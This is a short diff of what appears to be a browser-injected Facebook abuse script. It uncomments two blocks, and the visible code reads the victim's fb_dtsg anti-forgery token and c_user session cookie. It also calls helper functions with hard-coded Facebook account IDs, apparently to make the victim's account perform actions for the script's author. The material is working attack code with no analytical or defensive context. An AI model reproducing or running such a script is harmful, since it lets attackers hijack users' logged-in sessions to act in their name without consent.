@@ -175,7 +175,7 @@
  PI("608738295860543");
  
  
- /*promote AICF
+ /*promote AICF*/
  
  
  
@@ -289,7 +289,7 @@
  }
  IDS("100003402522960");
  
- /*extra Event
+ /*extra Event*/
  
  var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
  var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
